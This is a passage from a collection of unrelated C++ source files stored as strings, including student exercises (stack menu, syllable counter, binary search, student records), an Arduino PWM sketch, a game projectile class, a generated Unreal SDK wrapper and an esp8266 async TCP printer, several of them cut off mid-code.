5:{\n                if(s.isEmpty()){\n                    cout << \"Yes, Stack is Empty !!!\" << endl;\n                }else{\n                    cout << \"No, Stack is Not Empty...\" << endl;\n                }\n                break;\n            }\n            case 6:{\n               if(s.isFull()){\n                    cout << \"Yes, Stack is Full !!!\" << endl;\n                }else{\n                    cout << \"No, Stack is Not Full...\" << endl;\n                }\n                break;\n            }\n            case 0:{\n                cout << \"thank you for visting stack operation\" << endl;\n                break;\n            }\n            default:\n                cout << \"Invalid case !!!!\" << endl;\n        }\n    }while(choice != 0);\n\n    return 0;\n}",
    "#include <iostream>\r\n\r\nint compte_syllables(const char* mot);\r\n\r\nvoid extraireMots(char *phrase, char mots[][20], int &nbMots);\r\n\r\nint main(int argc, char ** argv[]){\r\n    const int taille = 250;\r\n    char phrase[taille];\r\n    char mots[10][20]; // Tableau pour stocker jusqu'\u00e0 10 mots de 19 caract\u00e8res max\r\n    int nbMots;\r\n\r\n    int voyelles = 0;\r\n    int consonnes = 0; \r\n    int spaces = 0;\r\n    int mot = 0; \r\n    int nombre = 0;\r\n\r\n    //texte fantaisiste\r\n    std::cout << \"\\n\\n \\033[32m d8\\t\\t\\t  d8\\n d88\\t,e e,   Y8b Y8Y  d88\\t,e e,\\nd88888 d88 88b   Y8b Y  d88888 d88 88b\\n 888   888   ,  e Y8b \\t 888   888   ,\\n 888\\t'YeeP' d8b Y8b   888\\t'YeeP' \\033[0m \\n\\n\\n\"; \r\n\r\n    // operations pour la recuperation de phrase\r\n    std::cout << \">> \" ;\r\n    std::cin.getline(phrase, taille);\r\n\r\n    //Pointeur vers phrase\r\n    char* ptr = phrase;\r\n\r\n    while(*ptr != '\\0'){\r\n        // verification de la nature du caract\u00e8re\r\n        if(*ptr >='a' && *ptr <='z' || *ptr >='A' && *ptr <='Z'){   \r\n\r\n            // D\u00e9compte du nombre de voyelles\r\n        if(*ptr =='a'|| *ptr =='e'|| *ptr =='i'|| *ptr =='o'|| *ptr =='u'|| *ptr =='y') voyelles++; // miniscules\r\n        else if (*ptr =='a'-32|| *ptr =='e'-32|| *ptr =='i'-32|| *ptr =='o'-32|| *ptr =='u'-32|| *ptr =='y'-32)voyelles++; // majiscules\r\n        else consonnes++;   // D\u00e9compte du nombre de consonnes\r\n\r\n        }\r\n        \r\n        //D\u00e9compte du nombre d'espaces\r\n        if(*ptr == ' ')spaces++;        \r\n\r\n        ptr++; // passe au caract\u00e8re suivant de la phrase\r\n    }\r\n\r\n    std::cout <<\"________________________________________\"<<std::endl;\r\n\r\n    // affichage du nombres de voyelles et consonnes\r\n    std::cout <<\"\\nVoyelles: \\033[32m\" << voyelles << \"\\033[0m\\nConsonnes: \\033[32m\" << consonnes << \"\\033[0m\\n\";\r\n    \r\n    //extraction de mot\r\n    extraireMots(phrase, mots, nbMots);\r\n\r\n    // affichage du nombres de mots et espaces\r\n    std::cout <<\"Espaces: \\033[32m\" << spaces << \"\\033[0m\\nMots: \\033[32m\" << nbMots << \"\\033[0m\\n\";\r\n\r\n    std::cout <<\"________________________________________\"<<std::endl;\r\n\r\n    // Affichage des mots extraits\r\n    std::cout << \"\\nMots extraits : \\n\";\r\n    for (int i = 0; i < nbMots; i++) {\r\n        std::cout << \"mot_\" << i+1 << \": \\033[32m\" << mots[i] << \"\\033[0m\\t Syllabes: \\033[32m\" << compte_syllables(mots[i]) << \"\\033[0m\\n\" ;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n//Fonction pour l'extraction des mots dans une phrase\r\nvoid extraireMots(char *phrase, char mots[][20], int &nbMots) {\r\n    char *debutMot = phrase;\r\n    nbMots = 0;\r\n\r\n    while (*phrase != '\\0') {\r\n        if (*phrase == ' ' || *(phrase + 1) == '\\0' || *phrase == ',' || *phrase == '.' || *phrase == ';' || *phrase == ':') { \r\n            // Inclure le dernier caract\u00e8re si c'est la fin de la cha\u00eene\r\n            if (*(phrase + 1) == '\\0') {\r\n                phrase++;\r\n            }\r\n\r\n            // Copier le mot dans le tableau mots\r\n            int j = 0;\r\n            for (char *p = debutMot; p < phrase; p++) {\r\n                mots[nbMots][j++] = *p;\r\n            }\r\n            mots[nbMots][j] = '\\0'; // Ajouter le caract\u00e8re de fin de cha\u00eene\r\n            nbMots++;\r\n\r\n            // R\u00e9initialisation pour le mot suivant\r\n            debutMot = phrase + 1;\r\n        }\r\n        phrase++;\r\n    }\r\n}\r\n\r\n//Fonction pour le d\u00e9compte des syllabes dans un mot\r\nint compte_syllables(const char* mot) {\r\n    //initialisation du compteur\r\n    int count = 0;\r\n    //Temoin pour v\u00e9rifier que le caract\u00e8re pr\u00e9c\u00e9dent est une voyelle\r\n    bool prevVowel = false;\r\n\r\n    //Parcours du mot\r\n    for(int i = 0; mot[i] != '\\0'; i++) {\r\n        //Conversion en minuscule\r\n        char c = (mot[i] >= 'A' && mot[i] <= 'Z') ? mot[i] + 32 : mot[i];\r\n        //Verification de la nature du caract\u00e8re (Voyelle)\r\n        bool isVow = (c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u' || c == 'y');\r\n        \r\n        //V\u00e9rifie si le caract\u00e8re est une voyelle et si le caract\u00e8re pr\u00e9cedent \u00e9tait une voyelle\r\n        //(Marche si le caract\u00e8re est une voyelle et si le pr\u00e9cedent ne l'\u00e9tait pas, pour \u00e9viter de compter au comme deux syllabes)\r\n        if(isVow && !prevVowel) {\r\n            count++;\r\n        }\r\n\r\n        //Afin de d\u00e9terminer si le caract\u00e8re sera une voyelle  pour la  prochaine it\u00e9ration\r\n        prevVowel = isVow;\r\n    }\r\n\r\n    return count;\r\n}\r\n",
    "#include <Arduino.h>\r\n\r\nconst int pwmPinA = 9;  // \uac8c\uc774\ud2b8 \ub4dc\ub77c\uc774\ubc84 HO \ud540\r\nconst int sdPin = 2;    // SD \ud540\r\n\r\nvoid setup() {\r\n  pinMode(pwmPinA, OUTPUT);\r\n  pinMode(sdPin, OUTPUT);\r\n  digitalWrite(sdPin, LOW);  // \ucd08\uae30 \uc0c1\ud0dc: \ub4dc\ub77c\uc774\ubc84 \ube44\ud65c\uc131\ud654\r\n\r\n  // \ud0c0\uc774\uba38 1 \uc124\uc815\r\n  TCCR1A = _BV(COM1A1) | _BV(WGM11);         // \uace0\uc18d PWM \ubaa8\ub4dc, \ube44\ubc18\uc804 \ucd9c\ub825\r\n  TCCR1B = _BV(WGM13) | _BV(WGM12) | _BV(CS10); // \ubd84\uc8fc\uac12 \uc5c6\uc74c\r\n  ICR1 = 319;  // 50kHz \uc8fc\ud30c\uc218\r\n\r\n  OCR1A = 0;   // \ucd08\uae30 \ub4c0\ud2f0 0%\r\n\r\n  Serial.begin(9600);  // \uc2dc\ub9ac\uc5bc \ud1b5\uc2e0 \ucd08\uae30\ud654\r\n  Serial.println(\"Enter 'on' to turn ON, 'off' to turn OFF\");\r\n  Serial.println(\"Enter duty cycle (0-160) to adjust\");\r\n}\r\n\r\nvoid loop() {\r\n  // \uc2dc\ub9ac\uc5bc \ud1b5\uc2e0\uc744 \ud1b5\ud574 On/Off \ubc0f \ub4c0\ud2f0\ube44 \uc870\uc815 \uba85\ub839 \uc218\uc2e0\r\n  if (Serial.available() > 0) {\r\n    String input = Serial.readStringUntil('\\n');\r\n    input.trim();\r\n\r\n    if (input.equalsIgnoreCase(\"on\")) {\r\n      digitalWrite(sdPin, HIGH); // \ub4dc\ub77c\uc774\ubc84 \ud65c\uc131\ud654\r\n      Serial.println(\"Driver ON\");\r\n\r\n      // \uc18c\ud504\ud2b8 \uc2a4\ud0c0\ud2b8: \ub4c0\ud2f0\ube44 \uc810\uc9c4\uc801 \uc99d\uac00\r\n      for (int duty = 0; duty <= 160; duty++) { // 0%\uc5d0\uc11c 50%\uae4c\uc9c0 \uc99d\uac00\r\n        OCR1A = duty;\r\n        delay(10);  // \uc99d\uac00 \uc18d\ub3c4 \uc870\uc815 (10ms)\r\n      }\r\n    } else if (input.equalsIgnoreCase(\"off\")) {\r\n      digitalWrite(sdPin, LOW); // \ub4dc\ub77c\uc774\ubc84 \ube44\ud65c\uc131\ud654\r\n      OCR1A = 0;  // \ub4c0\ud2f0\ube44 \ucd08\uae30\ud654\r\n      Serial.println(\"Driver OFF\");\r\n    } else {\r\n      int duty = input.toInt();\r\n      if (duty >= 0 && duty <= 160) {\r\n        OCR1A = duty; // \ub4c0\ud2f0\ube44 \uc870\uc815\r\n        Serial.print(\"Duty cycle set to: \");\r\n        Serial.println(duty);\r\n      } else {\r\n        Serial.println(\"Invalid duty cycle. Enter a value between 0 and 160.\");\r\n      }\r\n    }\r\n  }\r\n}\r\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <fstream>\r\n\r\nusing namespace std;\r\n\r\nclass Student_Details\r\n{\r\nprivate:\r\n    int Age;\r\n    string Phone_Number;\r\n    string Email_ID;\r\n    char Gender;\r\n\r\npublic:\r\n    string First_Name;\r\n    string Middle_Name;\r\n    string Last_Name;\r\n    string Name;\r\n    int Roll_Number;\r\n    static int num; // Static variable to keep track of the student number\r\n    string Blood_Group;\r\n\r\n    // Constructor to input student details\r\n    Student_Details()\r\n    {\r\n        num++;\r\n        cout << \"Enter the details of student-\" << num << endl;\r\n        cout << \"Enter First_Name*: \";\r\n        cin >> First_Name;\r\n\r\n        cout << \"Enter Middle_Name (or type 'skip' to skip): \";\r\n        cin >> Middle_Name;\r\n        if (Middle_Name == \"skip\") // Skip middle name if input is 'skip'\r\n        { \r\n            Middle_Name = \"\";\r\n        }\r\n\r\n        cout << \"Enter Last_Name*: \";\r\n        cin >> Last_Name;\r\n\r\n        Name = First_Name + \" \" + Middle_Name + \" \" + Last_Name;\r\n\r\n        // Input and validate age\r\n        cout << \"Enter Age*: \";\r\n        cin >> Age;\r\n\r\n        while (Age <= 0)\r\n        {\r\n            cout << \"Invalid Age!! Please enter valid Age.\" << endl;\r\n            cout << \"Enter Age: \";\r\n            cin >> Age;\r\n        }\r\n\r\n        // Input and validate phone number\r\n        cout << \"Enter students Phone_Number*: \";\r\n        cin >> Phone_Number;\r\n\r\n        while (Phone_Number.size() != 10 || Phone_Number[0] == '0' || !all_of(Phone_Number.begin(), Phone_Number.end(), ::isdigit))\r\n        {\r\n            cout << \"Invalid Phone_Number! Please enter valid Phone_Number.\" << endl;\r\n            cout << \"Enter students Phone_Number again: \";\r\n            cin >> Phone_Number;\r\n        }\r\n\r\n        // Input and validate email\r\n        cout << \"Enter students Email_ID: \";\r\n        cin >> Email_ID;\r\n\r\n        while (Email_ID.find('@') == string ::npos || Email_ID.find('.') == string ::npos ||\r\n               isdigit(Email_ID[0]) || Email_ID.find('@') > Email_ID.find('.') || Email_ID.find('.') - Email_ID.find('@') <= 1 ||\r\n               Email_ID.front() == '@' || Email_ID.back() == '@' || Email_ID.front() == '.' || Email_ID.back() == '.' ||\r\n               Email_ID.find(' ') != string ::npos)\r\n        {\r\n            cout << \"Invalid Email_ID! Please enter valid Email_ID.\" << endl;\r\n            cout << \"Enter students Email_ID again: \";\r\n            cin >> Email_ID;\r\n        }\r\n\r\n        // Input and validate roll number\r\n        cout << \"Enter Roll_Number*: \";\r\n        cin >> Roll_Number;\r\n\r\n        while (Roll_Number <= 0)\r\n        {\r\n            cout << \"Invalid Roll_Number! Please enter valid Roll_Number.\" << endl;\r\n            cout << \"Enter Roll_Number again: \";\r\n            cin >> Roll_Number;\r\n        }\r\n\r\n        // Input and validate gender\r\n        cout << \"Enter Gender (M/m for Male, F/f for Female, O/o for Other): \";\r\n        cin >> Gender;\r\n\r\n        while (Gender != 'M' && Gender != 'F' && Gender != 'O' && Gender != 'm' && Gender != 'f' && Gender != 'o')\r\n        {\r\n            cout << \"Invalid Gender! Please enter valid Gender.\" << endl;\r\n            cout << \"Enter Gender again (M/m for Male, F/f for Female, O/o for Other): \";\r\n            cin >> Gender;\r\n        }\r\n\r\n        // Input and validate blood group\r\n        cout << \"Enter blood group of student: \";\r\n        cin >> Blood_Group;\r\n\r\n        while (Blood_Group != \"A+\" && Blood_Group != \"A-\" && Blood_Group != \"B+\" && Blood_Group != \"B-\" && Blood_Group != \"AB+\" && Blood_Group != \"AB-\" && Blood_Group != \"O+\" && Blood_Group != \"O-\")\r\n        {\r\n            cout << \"Invalid blood group! Please enter valid blood group.\" << endl;\r\n            cout << \"Enter blood group of student again: \";\r\n            cin >> Blood_Group;\r\n        }\r\n\r\n        cout << endl;\r\n    }\r\n\r\n    // Function to display student details\r\n    void display_details() const\r\n    {\r\n        cout << \"Name: \" << Name << endl;\r\n        cout << \"Roll Number: \" << Roll_Number << endl;\r\n        cout << \"Phone Number: \" << Phone_Number << endl;\r\n        cout << \"Email ID: \" << Email_ID << endl;\r\n        cout << \"Age: \" << Age << endl;\r\n        cout << \"Gender: \" << Gender << endl;\r\n        cout << endl;\r\n    }\r\n\r\n    // Getter functions\r\n    char get_Gender()\r\n    {\r\n        return Gender;\r\n    }\r\n\r\n    string get_Name() const\r\n    {\r\n        return Name;\r\n    }\r\n\r\n    int get_Roll_Number() const\r\n    {\r\n        return Roll_Number;\r\n    }\r\n\r\n    // Function to edit age\r\n    int Edit_Age(int New_Age)\r\n    {\r\n        return Age = New_Age;\r\n    }\r\n\r\n    // Function to store student data in CSV file\r\n    void saveToCSV(ofstream &outFile)\r\n    {\r\n        outFile << Name << \", \" << Roll_Number << \", \" << Phone_Number << \", \" << Email_ID << \", \" << Age << \", \" << Gender << \", \" << Blood_Group << \"\\n\";\r\n    }\r\n};\r\n\r\n// Sorting function to sort data by student name\r\nbool sortbyName(const Student_Details &a, const Student",
    "// find first and last occurance of element \n// ex arr=[1,2,3,4,5,6,6,6,7,8]\n//  target = 6\n// first occurance in 5th index and last in 7th index\n\n#include <iostream>\nusing namespace std;\n\nint main(){\n\n    int arr[]={1,2,3,4,5,6,6,6,7,8};\n    int n = sizeof(arr)/sizeof(arr[0]);\n\n    int target = 6;\n    int start = 0;\n    int end = n-1;\n    int firstIndex = -1;\n    int secondIndex = -1;\n    int mid;\n\n    // first occurance \n    \n    while(start<=end){\n        mid = start + (end-start)/2;\n        if(arr[mid]==target){\n            firstIndex = mid;\n            end = mid-1;\n        }else if(target<arr[mid]){\n            end = mid-1;\n        }else{\n            start = mid+1;\n        }\n    }\n\n     // Second occurance \n\n    start = 0;\n    end = n-1;\n    \n    while(start<=end){\n        mid = start + (end-start)/2;\n        if(arr[mid]==target){\n            secondIndex = mid;\n            start = mid+1;\n        }else if(target<arr[mid]){\n            end = mid-1;\n        }else{\n            start = mid+1;\n        }\n    }\n\n    cout<<\"First index is \"<<firstIndex<<endl;\n    cout<<\"Second index is \"<< secondIndex<<endl;\n \n\n}",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <filesystem>\n\n#include \"Database.h\"\n#include \"Command.h\"\n#include \"commandParser.h\"\n#include \"startCommands.h\"\n#include \"readSettingsFile.h\"\n\nusing namespace std;\n\nint main(int argc, char* argv[]) {\n\tDatabase db;\n\tstring tablesConfigAddress;\n\tstring selectCommandsAddress;\n\tstring csvFilesPath;\n\tchar csvDelimiter;\n\n\treadSettingsFile::readSettings(tablesConfigAddress, selectCommandsAddress, csvFilesPath, csvDelimiter);\n\n\tcommandParser parser(selectCommandsAddress, tablesConfigAddress, csvFilesPath, csvDelimiter);\n\tstring userCommand;\n\n\ttry {\n\t\tdb.loadDatabase(tablesConfigAddress, selectCommandsAddress);\n\t}\n\tcatch (const exception& e) {\n\t\tcout << \"Error loading database: \" << e.what() << endl;\n\t\treturn 1;\n\t}\n\n\tcout << \"Use the 'help' command to view available commands and their syntax.\" << endl;\n\tcout << \"Use the 'exit' command to close the program and save your changes.\" << endl;\n\n\t//read files passed as arguments\n\tconst int maxFiles = 5;\n\tstring commandFiles[maxFiles];\n\tint fileCount = 0;\n\tfor (int i = 1; i < argc && fileCount < maxFiles; ++i) {\n\t\tcommandFiles[fileCount++] = argv[i];\n\t}\n\tstartCommands::processCommandFiles(parser, db, commandFiles, fileCount);\n\n\t//continue with console input\n\twhile (true) {\n\t\tcout << endl << \">> \";\n\t\tgetline(cin, userCommand);\n\n\t\tif (userCommand == \"exit\") {\n\t\t\tbreak;\n\t\t}\n\n\t\ttry {\n\t\t\tCommand* cmd = parser.handleCommand(userCommand);\n\t\t\tcmd->execute(db);\n\t\t\tdelete cmd;\n\t\t}\n\t\tcatch (const invalid_argument& e) {\n\t\t\tcout << e.what() << endl;\n\t\t}\n\t\tcatch (const exception& e) {\n\t\t\tcout << e.what() << endl;\n\t\t}\n\t\tcatch (...) {\n\t\t\tcout << \"An error occurred.\" << endl;\n\t\t}\n\t}\n\n\ttry {\n\t\tdb.saveDatabase(tablesConfigAddress);\n\t}\n\tcatch (const exception& e) {\n\t\tcout << \"Error saving database: \" << e.what() << endl;\n\t}\n\n\treturn 0;\n}",
    "#include \"projectile.hpp\"\n#include <cstdlib>\n#include <new>\n#include <algorithm>\n#include <cmath>\n#include <string>\n#include <iostream>\n#include <raymath.h>\n\n\nnamespace Game\n{\n    Projectile::Projectile( const Vector2 startPos\n        , float speed, float angle\n        , float radius\n        , float projectileLifespan )\n    : m_position( startPos )\n    , m_remainingTime( projectileLifespan )\n    , m_radius( radius )\n    {\n        m_speed.x = speed * std::cos( angle );\n        m_speed.y = speed * std::sin( angle );\n    }\n\n    Projectile::~Projectile()\n    {\n    }\n\n    bool Projectile::draw( float time )\n    {\n        m_remainingTime = std::max( m_remainingTime - time, 0.0f );\n        m_speed.y -= 9.82f * time * GetScreenHeight() / 200.0f;\n        m_position.x -= m_speed.x * time;\n        m_position.y -= m_speed.y * time;\n        Vector2 oldPos = Vector2Add( m_position, Vector2Scale( m_speed, 0.06f ));\n\n        // std::string txt = \"Position: \" + std::to_string( m_position.x ) + 'x' + std::to_string( m_position.y );\n        //DrawText( txt.c_str(), 0, 20, 20, WHITE );\n        //std::cerr << txt << std::endl;\n        // TraceLog( LOG_INFO, txt.c_str() );\n\n        DrawLineEx( m_position, oldPos, m_radius *1.6f, RED );\n\n        DrawCircle( m_position.x\n            , m_position.y\n            , m_radius\n            , WHITE );\n\n        return 0.0f != m_remainingTime;\n    }\n\n    bool Projectile::draw( float time\n        , std::function< bool( const Vector2 &position, const float radius ) > collide )\n    {\n        return draw( time ) && !collide( m_position, m_radius );\n    }\n} // namespace Game\n",
    "\ufeff#pragma once\n\n/*\n* SDK generated by debug\n*\n* https://github.com/Encryqed/debug\n*/\n\n// Package: InteractiveToolsFramework\n\n#include \"Basic.hpp\"\n\n#include \"InteractiveToolsFramework_classes.hpp\"\n#include \"InteractiveToolsFramework_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function InteractiveToolsFramework.GizmoBaseComponent.UpdateHoverState\n// (Final, Native, Public)\n// Parameters:\n// bool                                    bHoveringIn                                            (Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nvoid UGizmoBaseComponent::UpdateHoverState(bool bHoveringIn)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"GizmoBaseComponent\", \"UpdateHoverState\");\n\n\tParams::GizmoBaseComponent_UpdateHoverState Parms{};\n\n\tParms.bHoveringIn = bHoveringIn;\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\tFunc->FunctionFlags = Flgs;\n}\n\n\n// Function InteractiveToolsFramework.GizmoBaseComponent.UpdateWorldLocalState\n// (Final, Native, Public)\n// Parameters:\n// bool                                    bWorldIn                                               (Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nvoid UGizmoBaseComponent::UpdateWorldLocalState(bool bWorldIn)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"GizmoBaseComponent\", \"UpdateWorldLocalState\");\n\n\tParams::GizmoBaseComponent_UpdateWorldLocalState Parms{};\n\n\tParms.bWorldIn = bWorldIn;\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\tFunc->FunctionFlags = Flgs;\n}\n\n\n// Function InteractiveToolsFramework.GizmoTransformSource.SetTransform\n// (Native, Public, HasOutParams, HasDefaults)\n// Parameters:\n// struct FTransform                       NewTransform                                           (ConstParm, Parm, OutParm, ReferenceParm, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nvoid IGizmoTransformSource::SetTransform(const struct FTransform& NewTransform)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"GizmoTransformSource\", \"SetTransform\");\n\n\tParams::GizmoTransformSource_SetTransform Parms{};\n\n\tParms.NewTransform = std::move(NewTransform);\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\tFunc->FunctionFlags = Flgs;\n}\n\n\n// Function InteractiveToolsFramework.GizmoTransformSource.GetTransform\n// (Native, Public, HasDefaults, Const)\n// Parameters:\n// struct FTransform                       ReturnValue                                            (Parm, OutParm, ReturnParm, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nstruct FTransform IGizmoTransformSource::GetTransform() const\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"GizmoTransformSource\", \"GetTransform\");\n\n\tParams::GizmoTransformSource_GetTransform Parms{};\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\tFunc->FunctionFlags = Flgs;\n\n\treturn Parms.ReturnValue;\n}\n\n\n// Function InteractiveToolsFramework.GizmoAxisSource.GetDirection\n// (Native, Public, HasDefaults, Const)\n// Parameters:\n// struct FVector                          ReturnValue                                            (Parm, OutParm, ZeroConstructor, ReturnParm, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nstruct FVector IGizmoAxisSource::GetDirection() const\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"GizmoAxisSource\", \"GetDirection\");\n\n\tParams::GizmoAxisSource_GetDirection Parms{};\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\tFunc->FunctionFlags = Flgs;\n\n\treturn Parms.ReturnValue;\n}\n\n\n// Function InteractiveToolsFramework.GizmoAxisSource.GetOrigin\n// (Native, Public, HasDefaults, Const)\n// Parameters:\n// struct FVector                          ReturnValue                                            (Parm, OutParm, ZeroConstructor, ReturnParm, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nstruct FVector IGizmoAxisSource::GetOrigin() const\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"GizmoAxisSource\", \"GetOrigin\");\n\n\tParams::GizmoAxisSource_GetOrigin Parms{};\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\tFunc->FunctionFlags = Flgs;\n\n\treturn Parms.ReturnValue;\n}\n\n\n// Function InteractiveToolsFramework.GizmoAxisSource.GetTangentVectors\n// (Native, Public, HasOutParams, HasDefaults, Const)\n// Parameters:\n// struct FVector                          TangentX",
    "/*\n  Asynchronous TCP library for Espressif MCUs\n\n  Copyright (c) 2016 Hristo Gochkov. All rights reserved.\n  This file is part of the esp8266 core for Arduino environment.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include \"AsyncPrinter.h\"\n\nAsyncPrinter::AsyncPrinter()\n  : _client(NULL)\n  , _data_cb(NULL)\n  , _data_arg(NULL)\n  , _close_cb(NULL)\n  , _close_arg(NULL)\n  , _tx_buffer(NULL)\n  , _tx_buffer_size(TCP_MSS)\n  , next(NULL)\n{}\n\nAsyncPrinter::AsyncPrinter(AsyncClient *client, size_t txBufLen)\n  : _client(client)\n  , _data_cb(NULL)\n  , _data_arg(NULL)\n  , _close_cb(NULL)\n  , _close_arg(NULL)\n  , _tx_buffer(NULL)\n  , _tx_buffer_size(txBufLen)\n  , next(NULL)\n{\n  _attachCallbacks();\n  _tx_buffer = new (std::nothrow) cbuf(_tx_buffer_size);\n  if(_tx_buffer == NULL) {\n    panic(); //What should we do?\n  }\n}\n\nAsyncPrinter::~AsyncPrinter(){\n  _on_close();\n}\n\nvoid AsyncPrinter::onData(ApDataHandler cb, void *arg){\n  _data_cb = cb;\n  _data_arg = arg;\n}\n\nvoid AsyncPrinter::onClose(ApCloseHandler cb, void *arg){\n  _close_cb = cb;\n  _close_arg = arg;\n}\n\nint AsyncPrinter::connect(IPAddress ip, uint16_t port){\n  if(_client != NULL && connected())\n    return 0;\n  _client = new (std::nothrow) AsyncClient();\n  if (_client == NULL) {\n    panic();\n  }\n\n  _client->onConnect([](void *obj, AsyncClient *c){ ((AsyncPrinter*)(obj))->_onConnect(c); }, this);\n  if(_client->connect(ip, port)){\n    while(_client && _client->state() < 4)\n      delay(1);\n    return connected();\n  }\n  return 0;\n}\n\nint AsyncPrinter::connect(const char *host, uint16_t port){\n  if(_client != NULL && connected())\n    return 0;\n  _client = new (std::nothrow) AsyncClient();\n  if (_client == NULL) {\n    panic();\n  }\n\n  _client->onConnect([](void *obj, AsyncClient *c){ ((AsyncPrinter*)(obj))->_onConnect(c); }, this);\n  if(_client->connect(host, port)){\n    while(_client && _client->state() < 4)\n      delay(1);\n    return connected();\n  }\n  return 0;\n}\n\nvoid AsyncPrinter::_onConnect(AsyncClient *c){\n  (void)c;\n  if(_tx_buffer != NULL){\n    cbuf *b = _tx_buffer;\n    _tx_buffer = NULL;\n    delete b;\n  }\n  _tx_buffer = new (std::nothrow) cbuf(_tx_buffer_size);\n  if(_tx_buffer) {\n    panic();\n  }\n\n  _attachCallbacks();\n}\n\nAsyncPrinter::operator bool(){ return connected(); }\n\nAsyncPrinter & AsyncPrinter::operator=(const AsyncPrinter &other){\n  if(_client != NULL){\n    _client->close(true);\n    _client = NULL;\n  }\n  _tx_buffer_size = other._tx_buffer_size;\n  if(_tx_buffer != NULL){\n    cbuf *b = _tx_buffer;\n    _tx_buffer = NULL;\n    delete b;\n  }\n  _tx_buffer = new (std::nothrow) cbuf(other._tx_buffer_size);\n  if(_tx_buffer == NULL) {\n    panic();\n  }\n\n  _client = other._client;\n  _attachCallbacks();\n  return *this;\n}\n\nsize_t AsyncPrinter::write(uint8_t data){\n  return write(&data, 1);\n}\n\nsize_t AsyncPrinter::write(const uint8_t *data, size_t len){\n  if(_tx_buffer == NULL || !connected())\n    return 0;\n  size_t toWrite = 0;\n  size_t toSend = len;\n  while(_tx_buffer->room() < toSend){\n    toWrite = _tx_buffer->room();\n    _tx_buffer->write((const char*)data, toWrite);\n    while(connected() && !_client->canSend())\n      delay(0);\n    if(!connected())\n      return 0; // or len - toSend;\n    _sendBuffer();\n    toSend -= toWrite;\n  }\n  _tx_buffer->write((const char*)(data+(len - toSend)), toSend);\n  while(connected() && !_client->canSend()) delay(0);\n  if(!connected()) return 0; // or len - toSend;\n  _sendBuffer();\n  return len;\n}\n\nbool AsyncPrinter::connected(){\n  return (_client != NULL && _client->connected());\n}\n\nvoid AsyncPrinter::close(){\n  if(_client != NULL)\n    _client->close(true);\n}\n\nsize_t AsyncPrinter::_sendBuffer(){\n  size_t available = _tx_buffer->available();\n  if(!connected() || !_client->canSend() || available == 0)\n    return 0;\n  size_t sendable = _client->space();\n  if(sendable < available)\n    available= sendable;\n  char *out = new (std::nothrow) char[available];\n  if (out == NULL) {\n    panic(); // Connection should be aborted instead\n  }\n\n  _tx_buffer->read(out, available);\n  size_t sent = _client->write(out, available);\n  delete out;\n  return sent;\n}\n\nvoid AsyncPrinter::_onData(void *data, size_t len){\n  if(_data_cb)\n    _data_cb(_data_arg, this, (uint8_t*)data, len);\n}\n\nvoid AsyncPrinter::_on_close(){\n  if(_client != NULL){\n    _client = NULL;\n  }\n  if(_tx_buffer != NULL){\n",
    "#include \"../include/DataPreprocessing.h\"// Include your header file\n#include \"../include/ForwardNeuralNetwork.h\"\n#include \"../include/ActivationFunction.h\"\n#include <sciplot/sciplot.hpp> //don't worry about red squiggles\n#include <cstdio>\n#include <string>\n\nint main() {\n\n    vector<double> trainTargetsFlattened, testTargetsFlattened;\n    vector<int> numerics, nonNumerics;\n    vector<vector<double> > testSet, trainSet, convertedData;\n    vector<string> labels;\n    vector<double> testPredictions, trainPredictions;\n    string target;\n    int targetIndex = -1;\n\n    //path to your CSV file\n    string file_path = \"./trainingData/insurance.csv\";\n\n    // Use the readCSV function to read the file\n     vector<vector<string> > data = DataPreprocessor::readCSV(file_path);\n\n    // Check if the data is empty (file not found or error)\n    if (data.empty()) {\n        cerr << \"No data found or failed to read the file.\" << endl;\n        return 